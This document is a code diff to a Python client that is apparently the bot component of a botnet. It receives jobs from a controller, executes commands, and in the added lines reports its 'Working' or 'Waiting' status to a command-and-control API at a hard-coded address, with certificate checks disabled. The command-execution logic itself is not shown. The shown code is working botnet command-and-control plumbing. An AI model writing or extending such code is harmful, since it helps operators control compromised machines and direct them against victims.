@@ -53,7 +53,6 @@ class Client():
         print("[+] Got command")
         body = body.decode()
         job_data = json.loads(body)
-        print(job_data)
         self.botnet_job_id = job_data['Id']
         job_action = job_data['JobAction']
         command_id = job_data['CommandId']
@@ -78,6 +77,14 @@ class Client():
     
     def command_wrapper(command):
         def command_controller(self, command_args):
+            url = "https://192.168.0.112:45456/api/v1/Bots/bot/" + str(self.bot_id)
+            bot_data = requests.get(url=url, verify=False).json()
+            bot_data['status'] = "Working"
+            url = "https://192.168.0.112:45456/api/v1/Bots/" + str(self.bot_id)
+            headers = {'Content-type':'application/json', 'Accept':'application/json'}
+            result = requests.put(url=url, verify=False, json=bot_data, headers=headers)
+            print(result)
+
             while self.event_controller.is_set():
                 (is_done, result) = command(self, command_args)
                 if is_done:
@@ -90,6 +97,12 @@ class Client():
         url = "https://192.168.0.112:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
         requests.delete(url=url, verify=False)
         self.botnet_job_id = 0
+        url = "https://192.168.0.112:45456/api/v1/Bots/bot/" + str(self.bot_id)
+        bot_data = requests.get(url=url, verify=False).json()
+        bot_data['status'] = "Waiting"
+        url = "https://192.168.0.112:45456/api/v1/Bots/" + str(self.bot_id)
+        headers = {'Content-type':'application/json', 'Accept':'application/json'}
+        requests.put(url=url, verify=False, json=bot_data, headers=headers)
 
 
     def send_result(self, result):
